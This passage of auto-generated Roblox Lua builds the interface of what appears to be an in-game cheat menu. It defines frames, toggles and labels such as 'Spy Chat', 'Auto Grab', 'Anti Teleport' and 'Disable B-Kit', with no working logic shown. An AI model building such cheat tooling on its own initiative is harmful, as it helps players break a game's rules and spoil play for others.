G2L["24f"]["Text"] = [[Anti Teleport]];
G2L["24f"]["Name"] = [[text]];
G2L["24f"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.text.UIPadding
G2L["250"] = Instance.new("UIPadding", G2L["24f"]);
G2L["250"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.text.text
G2L["251"] = Instance.new("UIStroke", G2L["24f"]);
G2L["251"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.UIPadding
G2L["252"] = Instance.new("UIPadding", G2L["248"]);
G2L["252"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside
G2L["253"] = Instance.new("Frame", G2L["1be"]);
G2L["253"]["BorderSizePixel"] = 0;
G2L["253"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["253"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["253"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["253"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["253"]["Name"] = [[leftside]];
G2L["253"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab
G2L["254"] = Instance.new("Frame", G2L["253"]);
G2L["254"]["BorderSizePixel"] = 0;
G2L["254"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["254"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["254"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["254"]["Name"] = [[mainTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.mainScriptTCO
G2L["255"] = Instance.new("LocalScript", G2L["254"]);
G2L["255"]["Name"] = [[mainScriptTCO]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======
G2L["256"] = Instance.new("Frame", G2L["254"]);
G2L["256"]["BorderSizePixel"] = 0;
G2L["256"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["256"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["256"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["256"]["Name"] = [[======ACCENT======]];
G2L["256"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======.GuiColor
G2L["257"] = Instance.new("Frame", G2L["256"]);
G2L["257"]["BorderSizePixel"] = 0;
G2L["257"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["257"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["257"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["257"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["257"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======.GuiColor.UICorner
G2L["258"] = Instance.new("UICorner", G2L["257"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.UIListLayout
G2L["259"] = Instance.new("UIListLayout", G2L["254"]);
G2L["259"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["259"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======
G2L["25a"] = Instance.new("Frame", G2L["254"]);
G2L["25a"]["BorderSizePixel"] = 0;
G2L["25a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25a"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["25a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["25a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25a"]["Name"] = [[======TITLE======]];
G2L["25a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text
G2L["25b"] = Instance.new("TextLabel", G2L["25a"]);
G2L["25b"]["TextWrapped"] = true;
G2L["25b"]["BorderSizePixel"] = 0;
G2L["25b"]["TextSize"] = 14;
G2L["25b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["25b"]["TextTransparency"] = 0.3;
G2L["25b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25b"]["BackgroundTransparency"] = 1;
G2L["25b"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["25b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25b"]["Text"] = [[Main]];
G2L["25b"]["Name"] = [[text]];
G2L["25b"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text.text
G2L["25c"] = Instance.new("UIStroke", G2L["25b"]);
G2L["25c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text.UIPadding
G2L["25d"] = Instance.new("UIPadding", G2L["25b"]);
G2L["25d"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.minimise
G2L["25e"] = Instance.new("TextButton", G2L["25a"]);
G2L["25e"]["BorderSizePixel"] = 0;
G2L["25e"]["TextTransparency"] = 0.3;
G2L["25e"]["TextSize"] = 14;
G2L["25e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25e"]["BackgroundTransparency"] = 1;
G2L["25e"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["25e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25e"]["Text"] = [[-]];
G2L["25e"]["Name"] = [[minimise]];
G2L["25e"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.greystroke
G2L["25f"] = Instance.new("UIStroke", G2L["254"]);
G2L["25f"]["ZIndex"] = 99;
G2L["25f"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["25f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["25f"]["Name"] = [[greystroke]];
G2L["25f"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat
G2L["260"] = Instance.new("Frame", G2L["254"]);
G2L["260"]["BorderSizePixel"] = 0;
G2L["260"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["260"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["260"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["260"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["260"]["Name"] = [[spychat]];
G2L["260"]["LayoutOrder"] = 2;
G2L["260"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button
G2L["261"] = Instance.new("TextButton", G2L["260"]);
G2L["261"]["BorderSizePixel"] = 0;
G2L["261"]["TextTransparency"] = 1;
G2L["261"]["TextSize"] = 14;
G2L["261"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["261"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["261"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["261"]["BackgroundTransparency"] = 1;
G2L["261"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["261"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["261"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.UIPadding
G2L["262"] = Instance.new("UIPadding", G2L["261"]);
G2L["262"]["PaddingTop"] = UDim.new(0, 3);
G2L["262"]["PaddingRight"] = UDim.new(0, 3);
G2L["262"]["PaddingLeft"] = UDim.new(0, 3);
G2L["262"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame
G2L["263"] = Instance.new("Frame", G2L["261"]);
G2L["263"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["263"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["263"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["263"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["263"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.outlineStroke
G2L["264"] = Instance.new("UIStroke", G2L["263"]);
G2L["264"]["Thickness"] = 2;
G2L["264"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.toggleFade
G2L["265"] = Instance.new("CanvasGroup", G2L["263"]);
G2L["265"]["BorderSizePixel"] = 0;
G2L["265"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["265"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["265"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["265"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["265"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.toggleFade.UIGradient
G2L["266"] = Instance.new("UIGradient", G2L["265"]);
G2L["266"]["Rotation"] = 90;
G2L["266"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text
G2L["267"] = Instance.new("TextLabel", G2L["260"]);
G2L["267"]["TextWrapped"] = true;
G2L["267"]["BorderSizePixel"] = 0;
G2L["267"]["TextSize"] = 14;
G2L["267"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["267"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["267"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["267"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["267"]["BackgroundTransparency"] = 1;
G2L["267"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["267"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["267"]["Text"] = [[Spy Chat]];
G2L["267"]["Name"] = [[text]];
G2L["267"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text.UIPadding
G2L["268"] = Instance.new("UIPadding", G2L["267"]);
G2L["268"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text.text
G2L["269"] = Instance.new("UIStroke", G2L["267"]);
G2L["269"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.UIPadding
G2L["26a"] = Instance.new("UIPadding", G2L["260"]);
G2L["26a"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb
G2L["26b"] = Instance.new("Frame", G2L["254"]);
G2L["26b"]["BorderSizePixel"] = 0;
G2L["26b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26b"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["26b"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["26b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26b"]["Name"] = [[autograb]];
G2L["26b"]["LayoutOrder"] = 2;
G2L["26b"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button
G2L["26c"] = Instance.new("TextButton", G2L["26b"]);
G2L["26c"]["BorderSizePixel"] = 0;
G2L["26c"]["TextTransparency"] = 1;
G2L["26c"]["TextSize"] = 14;
G2L["26c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26c"]["BackgroundTransparency"] = 1;
G2L["26c"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["26c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26c"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.UIPadding
G2L["26d"] = Instance.new("UIPadding", G2L["26c"]);
G2L["26d"]["PaddingTop"] = UDim.new(0, 3);
G2L["26d"]["PaddingRight"] = UDim.new(0, 3);
G2L["26d"]["PaddingLeft"] = UDim.new(0, 3);
G2L["26d"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame
G2L["26e"] = Instance.new("Frame", G2L["26c"]);
G2L["26e"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["26e"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["26e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["26e"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["26e"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.outlineStroke
G2L["26f"] = Instance.new("UIStroke", G2L["26e"]);
G2L["26f"]["Thickness"] = 2;
G2L["26f"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.toggleFade
G2L["270"] = Instance.new("CanvasGroup", G2L["26e"]);
G2L["270"]["BorderSizePixel"] = 0;
G2L["270"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["270"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["270"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["270"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["270"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.toggleFade.UIGradient
G2L["271"] = Instance.new("UIGradient", G2L["270"]);
G2L["271"]["Rotation"] = 90;
G2L["271"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text
G2L["272"] = Instance.new("TextLabel", G2L["26b"]);
G2L["272"]["TextWrapped"] = true;
G2L["272"]["BorderSizePixel"] = 0;
G2L["272"]["TextSize"] = 14;
G2L["272"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["272"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["272"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["272"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["272"]["BackgroundTransparency"] = 1;
G2L["272"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["272"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["272"]["Text"] = [[Auto Grab]];
G2L["272"]["Name"] = [[text]];
G2L["272"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text.UIPadding
G2L["273"] = Instance.new("UIPadding", G2L["272"]);
G2L["273"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text.text
G2L["274"] = Instance.new("UIStroke", G2L["272"]);
G2L["274"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.UIPadding
G2L["275"] = Instance.new("UIPadding", G2L["26b"]);
G2L["275"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound
G2L["276"] = Instance.new("Frame", G2L["254"]);
G2L["276"]["BorderSizePixel"] = 0;
G2L["276"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["276"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["276"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["276"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["276"]["Name"] = [[disabledeletesound]];
G2L["276"]["LayoutOrder"] = 4;
G2L["276"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button
G2L["277"] = Instance.new("TextButton", G2L["276"]);
G2L["277"]["BorderSizePixel"] = 0;
G2L["277"]["TextTransparency"] = 1;
G2L["277"]["TextSize"] = 14;
G2L["277"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["277"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["277"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["277"]["ZIndex"] = 49;
G2L["277"]["BackgroundTransparency"] = 1;
G2L["277"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["277"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["277"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.UIPadding
G2L["278"] = Instance.new("UIPadding", G2L["277"]);
G2L["278"]["PaddingTop"] = UDim.new(0, 2);
G2L["278"]["PaddingRight"] = UDim.new(0, 3);
G2L["278"]["PaddingLeft"] = UDim.new(0, 3);
G2L["278"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame
G2L["279"] = Instance.new("Frame", G2L["277"]);
G2L["279"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["279"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["279"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["279"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["279"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.outlineStroke
G2L["27a"] = Instance.new("UIStroke", G2L["279"]);
G2L["27a"]["Thickness"] = 2;
G2L["27a"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.buttonFade
G2L["27b"] = Instance.new("CanvasGroup", G2L["279"]);
G2L["27b"]["BorderSizePixel"] = 0;
G2L["27b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27b"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27b"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.buttonFade.UIGradient
G2L["27c"] = Instance.new("UIGradient", G2L["27b"]);
G2L["27c"]["Rotation"] = 90;
G2L["27c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.text
G2L["27d"] = Instance.new("TextLabel", G2L["277"]);
G2L["27d"]["ZIndex"] = 2;
G2L["27d"]["BorderSizePixel"] = 0;
G2L["27d"]["TextSize"] = 14;
G2L["27d"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27d"]["BackgroundTransparency"] = 1;
G2L["27d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27d"]["Text"] = [[Disable Delete Sound]];
G2L["27d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.text.text
G2L["27e"] = Instance.new("UIStroke", G2L["27d"]);
G2L["27e"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.fillbar
G2L["27f"] = Instance.new("Frame", G2L["276"]);
G2L["27f"]["ZIndex"] = 90;
G2L["27f"]["BorderSizePixel"] = 0;
G2L["27f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27f"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["27f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27f"]["Name"] = [[fillbar]];
G2L["27f"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit
G2L["280"] = Instance.new("Frame", G2L["254"]);
G2L["280"]["BorderSizePixel"] = 0;
G2L["280"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["280"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["280"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["280"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["280"]["Name"] = [[disablebkit]];
G2L["280"]["LayoutOrder"] = 4;
G2L["280"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button
G2L["281"] = Instance.new("TextButton", G2L["280"]);
G2L["281"]["BorderSizePixel"] = 0;
G2L["281"]["TextTransparency"] = 1;
G2L["281"]["TextSize"] = 14;
G2L["281"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["281"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["281"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["281"]["ZIndex"] = 49;
G2L["281"]["BackgroundTransparency"] = 1;
G2L["281"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["281"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["281"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.UIPadding
G2L["282"] = Instance.new("UIPadding", G2L["281"]);
G2L["282"]["PaddingTop"] = UDim.new(0, 2);
G2L["282"]["PaddingRight"] = UDim.new(0, 3);
G2L["282"]["PaddingLeft"] = UDim.new(0, 3);
G2L["282"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame
G2L["283"] = Instance.new("Frame", G2L["281"]);
G2L["283"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["283"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["283"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["283"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["283"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.outlineStroke
G2L["284"] = Instance.new("UIStroke", G2L["283"]);
G2L["284"]["Thickness"] = 2;
G2L["284"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.buttonFade
G2L["285"] = Instance.new("CanvasGroup", G2L["283"]);
G2L["285"]["BorderSizePixel"] = 0;
G2L["285"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["285"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["285"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["285"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["285"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.buttonFade.UIGradient
G2L["286"] = Instance.new("UIGradient", G2L["285"]);
G2L["286"]["Rotation"] = 90;
G2L["286"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.text
G2L["287"] = Instance.new("TextLabel", G2L["281"]);
G2L["287"]["ZIndex"] = 2;
G2L["287"]["BorderSizePixel"] = 0;
G2L["287"]["TextSize"] = 14;
G2L["287"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["287"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["287"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["287"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["287"]["BackgroundTransparency"] = 1;
G2L["287"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["287"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["287"]["Text"] = [[Disable B-Kit]];
G2L["287"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.text.text
G2L["288"] = Instance.new("UIStroke", G2L["287"]);
G2L["288"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.fillbar
G2L["289"] = Instance.new("Frame", G2L["280"]);
G2L["289"]["ZIndex"] = 90;
G2L["289"]["BorderSizePixel"] = 0;
G2L["289"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["289"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["289"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["289"]["Name"] = [[fillbar]];
G2L["289"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---
G2L["28a"] = Instance.new("Frame", G2L["254"]);
G2L["28a"]["BorderSizePixel"] = 0;
G2L["28a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28a"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["28a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["28a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28a"]["Name"] = [[---DIVIDER---]];
G2L["28a"]["LayoutOrder"] = 3;
G2L["28a"]["BackgroundTransparency"] = 1;


